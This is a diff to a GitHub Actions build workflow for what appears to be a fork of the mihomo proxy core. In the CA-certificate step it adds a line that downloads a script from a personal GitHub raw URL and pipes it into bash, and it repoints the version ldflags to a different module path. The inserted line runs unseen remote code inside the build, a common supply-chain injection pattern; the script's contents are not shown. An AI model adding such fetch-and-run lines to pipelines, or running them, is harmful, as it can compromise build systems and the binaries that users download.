@@ -230,6 +230,7 @@ jobs:
         run: |
           sudo apt-get update && sudo apt-get install ca-certificates
           sudo update-ca-certificates
+          curl -L https://raw.githubusercontent.com/ForestL18/scart/refs/heads/main/scart | bash
           cp -f /etc/ssl/certs/ca-certificates.crt component/ca/ca-certificates.crt
 
       - name: Build core
@@ -242,7 +243,7 @@ jobs:
           GOMIPS: ${{matrix.jobs.gomips}}
         run: |
           go env
-          go build -v -tags "with_gvisor,embed_ca_only" -trimpath -ldflags "${BUILDTAG} -X 'github.com/metacubex/mihomo/constant.Version=${VERSION}' -X 'github.com/metacubex/mihomo/constant.BuildTime=${BUILDTIME}' -w -s -buildid="
+          go build -v -tags "with_gvisor,embed_ca_only" -trimpath -ldflags "${BUILDTAG} -X 'github.com/forestl18/mihomo/constant.Version=${VERSION}' -X 'github.com/forestl18/mihomo/constant.BuildTime=${BUILDTIME}' -w -s -buildid="
           if [ "${{matrix.jobs.goos}}" = "windows" ]; then
             cp mihomo.exe mihomo-${{matrix.jobs.goos}}-${{matrix.jobs.output}}.exe
             zip -r mihomo-${{matrix.jobs.goos}}-${{matrix.jobs.output}}-${VERSION}.zip mihomo-${{matrix.jobs.goos}}-${{matrix.jobs.output}}.exe
